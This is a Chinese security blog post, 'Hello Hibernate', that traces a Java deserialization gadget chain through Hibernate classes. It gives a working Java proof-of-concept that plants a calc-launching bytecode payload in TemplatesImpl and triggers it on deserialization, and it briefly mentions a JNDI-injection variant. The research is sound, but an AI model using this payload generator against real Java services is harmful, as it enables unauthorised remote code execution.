@@ -1,0 +1,373 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Hello Hibernate | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Hello Hibernate | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="简介
+Hibernate是一个开源免费的、基于 ORM 技术的 Java 持久化框架。通俗地说，Hibernate 是一个用来连接和操作数据库的 Java
+框架，它最大的优点是使用了 ORM 技术。
+Hibernate 支持几乎所有主流的关..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Hello Hibernate
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-12
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="简介">简介</h1>
+<p>Hibernate是一个开源免费的、基于 ORM 技术的 Java 持久化框架。通俗地说，Hibernate 是一个用来连接和操作数据库的 Java<br>
+框架，它最大的优点是使用了 ORM 技术。</p>
+<p>Hibernate 支持几乎所有主流的关系型数据库，只要在配置文件中设置好当前正在使用的数据库，程序员就不需要操心不同数据库之间的差异。</p>
+<h1 id="分析">分析</h1>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="propertyaccessor">PropertyAccessor</h3>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712141411027.png" alt="image-20230712141411027" loading="lazy"></figure>
+<h3 id="basicpropertyaccessor">BasicPropertyAccessor</h3>
+<p>BasicPropertyAccessor类实现了PropertyAccessor接口，构造方法传入了一个Class，Method和propertyName，然后在get方法中调用了Target的method方法。</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712141501198.png" alt="image-20230712141501198" loading="lazy"></figure>
+<p>来看看BasicPropertyAccessor重写的getSetter方法</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712141727409.png" alt="image-20230712141727409" loading="lazy"></figure>
+<p>重写后的getSetter方法调用了自身createSetter方法，createSetter方法继续调用getSetterOrNull方法，把结果进行返回。</p>
+<p>getSetterOrNull方法如下，调用setterMethod方法返回一个Method实例，然后包装成BasicSetter方法</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712142048613.png" alt="image-20230712142048613" loading="lazy"></figure>
+<p>在setterMethod方法中，通过调用getDeclareMethods()获取所有方法，然后判断是否以get开头，以get开头的就是getter。</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712142201278.png" alt="image-20230712142201278" loading="lazy"></figure>
+<h3 id="abstractcomponenttuplizer">AbstractComponentTuplizer</h3>
+<p>存在getPropertyValue方法，调用getters[i]的get方法</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712143007627.png" alt="image-20230712143007627" loading="lazy"></figure>
+<p>这里的getter数组是org.hibernate.property.Getter类，在上文提到getSetterOrNull方法最后返回的是一个BasicGetter方法，他是实现了Getter接口的</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712143312660.png" alt="image-20230712143312660" loading="lazy"></figure>
+<p>有PojoComponentTuplizer这么一个类，继承了AbstractComponentTuplizer抽象类，在他的getPropertyValues方法调用了父类的getPropertyValues方法</p>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712144039596.png" alt="image-20230712144039596" loading="lazy"></figure>
+<p>org/hibernate/type/ComponentType类存在getPropertyValues方法的调用</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712144403879.png" alt="image-20230712144403879" loading="lazy"></figure>
+<h3 id="typedvalue">TypedValue</h3>
+<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712144814809.png" alt="image-20230712144814809" loading="lazy"></figure>
+<p>构造方法调用initTransients()方法</p>
+<pre><code class="language-java">private void initTransients() {
+   this.hashcode = new ValueHolder&lt;Integer&gt;( new ValueHolder.DeferredInitializer&lt;Integer&gt;() {
+      @Override
+      public Integer initialize() {
+         return value == null ? 0 : type.getHashCode( value );
+      }
+   } );
+}
+</code></pre>
+<p>initTransients方法把hashcode赋值为一个重写了initialize方法的DeferredInitializer对象</p>
+<p>继续来看hashcode方法</p>
+<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712151307265.png" alt="image-20230712151307265" loading="lazy"></figure>
+<p>返回了hashcode.getValue()，其中hashcode是ValueHolder对象，就是调用ValueHolder.getValue方法</p>
+<figure data-type="image" tabindex="12"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712151403792.png" alt="image-20230712151403792" loading="lazy"></figure>
+<p>也就是调用了DeferredInitializer的initialize方法，该方法已被重写，方法内容如下</p>
+<figure data-type="image" tabindex="13"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712151703097.png" alt="image-20230712151703097" loading="lazy"></figure>
+<p>调用<code>type.getHashCode( value )</code></p>
+<h3 id="componenttype">ComponentType</h3>
+<p>org/hibernate/type/ComponentType 存在getHashCode方法</p>
+<figure data-type="image" tabindex="14"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712152405024.png" alt="image-20230712152405024" loading="lazy"></figure>
+<p>调用了getPropertyValue方法</p>
+<h2 id="hibernate1">Hibernate1</h2>
+<p>大致调用链如下:</p>
+<p>TypedValue-&gt;hashcode</p>
+<p>ValueHolder-&gt;getValue</p>
+<p>ValueHolder.DeferredInitializer-&gt;initialize</p>
+<p>ComponentType-&gt;getHashCode</p>
+<p>ComponentType-&gt;getPropertyValue</p>
+<p>AbstractComponentTuplizer-&gt;getPropertyValue</p>
+<p>BasicGetter-&gt;get</p>
+<p>然后就是用CC3去打字节码</p>
+<pre><code class="language-java">
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.hibernate.engine.spi.TypedValue;
+import org.hibernate.mapping.Component;
+import org.hibernate.type.Type;
+import util.Reflections;
+
+import java.io.*;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception {
+
+        Class&lt;?&gt; componentTypeClass             = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+
+
+        //动态创建字节码
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
+        ctClass.makeClassInitializer().insertBefore(cmd);
+        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        byte[] bytes = ctClass.toBytecode();
+
+        TemplatesImpl templates = new TemplatesImpl();
+
+        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();
+        Field name = templatesClass.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;ch1e&quot;);
+
+        Field tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+
+        Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(templates,new byte[][]{bytes});
+        Method method = TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;);
+
+        Object getter;
+        try {
+            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
+            Class&lt;?&gt;       getterImpl  = Class.forName(&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;);
+            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[0];
+            constructor.setAccessible(true);
+            getter = constructor.newInstance(null, null, method);
+        } catch (Exception ignored) {
+            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
+            Class&lt;?&gt;       basicGetter = Class.forName(&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);
+            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
+            constructor.setAccessible(true);
+            getter = constructor.newInstance(templates.getClass(), method, &quot;outputProperties&quot;);
+        }
+
+        // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
+
+//        Object tuplizer = pojoComponentTuplizerClass.newInstance();
+
+        Object tuplizer = Reflections.createWithoutConstructor(pojoComponentTuplizerClass);
+
+
+        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
+        Field field = abstractComponentTuplizerClass.getDeclaredField(&quot;getters&quot;);
+        field.setAccessible(true);
+        Object getters = Array.newInstance(getter.getClass(), 1);
+        Array.set(getters, 0, getter);
+        field.set(tuplizer, getters);
+
+        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
+//        Object type = componentTypeClass.newInstance();
+        Object type = Reflections.createWithoutConstructor(componentTypeClass);
+
+        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
+        Field field1 = componentTypeClass.getDeclaredField(&quot;componentTuplizer&quot;);
+        field1.setAccessible(true);
+        field1.set(type, tuplizer);
+
+        Field field2 = componentTypeClass.getDeclaredField(&quot;propertySpan&quot;);
+        field2.setAccessible(true);
+        field2.set(type, 1);
+
+        Field field3 = componentTypeClass.getDeclaredField(&quot;propertyTypes&quot;);
+        field3.setAccessible(true);
+        field3.set(type, new Type[]{(Type) type});
+
+        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
+        TypedValue typedValue = new TypedValue((Type) type, null);
+
+        // 创建反序列化用 HashMap
+        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(typedValue, &quot;su18&quot;);
+
+        // put 到 hashmap 之后再反射写入，防止 put 时触发
+        Field valueField = TypedValue.class.getDeclaredField(&quot;value&quot;);
+        valueField.setAccessible(true);
+        valueField.set(typedValue, templates);
+
+//        serialize(hashMap);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712164255991.png" alt="image-20230712164255991" loading="lazy"></figure>
+<h2 id="hibernate2">Hibernate2</h2>
+<p>用jdbcRowSetImpl链子打JNDI注入，具体再说吧。要下班了。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#propertyaccessor">PropertyAccessor</a></li>
+<li><a href="#basicpropertyaccessor">BasicPropertyAccessor</a></li>
+<li><a href="#abstractcomponenttuplizer">AbstractComponentTuplizer</a></li>
+<li><a href="#typedvalue">TypedValue</a></li>
+<li><a href="#componenttype">ComponentType</a></li>
+</ul>
+</li>
+<li><a href="#hibernate1">Hibernate1</a></li>
+<li><a href="#hibernate2">Hibernate2</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/life-in-2022/">
+              <h3 class="post-title">
+                Life in 2022
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
